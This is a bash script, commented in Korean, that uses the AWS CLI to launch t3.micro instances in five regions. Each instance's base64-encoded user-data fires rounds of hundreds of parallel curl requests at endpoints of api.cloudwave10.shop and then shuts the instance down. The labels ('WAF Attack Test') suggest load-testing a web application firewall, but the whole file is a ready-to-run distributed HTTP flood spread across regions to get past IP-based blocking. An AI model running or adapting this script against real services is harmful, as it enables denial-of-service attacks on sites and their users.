#!/bin/bash

# 리전 리스트
REGIONS=("us-east-1" "eu-west-1" "ap-northeast-1" "ap-southeast-1" "sa-east-1")

# 공격 스크립트 (Base64)
ATTACK_SCRIPT=$(echo '#!/bin/bash
echo "Attack starting from $(curl -s http://checkip.amazonaws.com)"
for round in {1..10}; do
  echo "Round $round - sending 100 requests"
  for i in {1..100}; do
    curl -s -o /dev/null https://api.cloudwave10.shop/api/v1/health &
    curl -s -o /dev/null https://api.cloudwave10.shop/api/v1/products/PROD001 &
    curl -s -o /dev/null "https://api.cloudwave10.shop/api/v1/products?id=test" &
  done
  wait
  sleep 1
done
shutdown -h now' | base64 -w 0)

# 각 리전에서 인스턴스 생성
for REGION in "${REGIONS[@]}"; do
  echo "🚀 Launching in $REGION..."
  
  # AMI ID 가져오기
  AMI=$(aws ssm get-parameters \
    --region $REGION \
    --names /aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2 \
    --query 'Parameters[0].Value' \
    --output text 2>/dev/null)
  
  # 보안 그룹 생성
  SG=$(aws ec2 create-security-group \
    --region $REGION \
    --group-name "waf-attack-$(date +%s)" \
    --description "WAF Attack Test" \
    --query 'GroupId' \
    --output text 2>/dev/null)
  
  # 인스턴스 생성 (백그라운드)
  aws ec2 run-instances \
    --region $REGION \
    --image-id $AMI \
    --instance-type t3.micro \
    --security-group-ids $SG \
    --instance-initiated-shutdown-behavior terminate \
    --user-data "$ATTACK_SCRIPT" \
    --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=WAF-$REGION}]" \
    --output text &
  
  echo "✅ Started in $REGION"
done

wait
echo "🎯 All instances launched!"
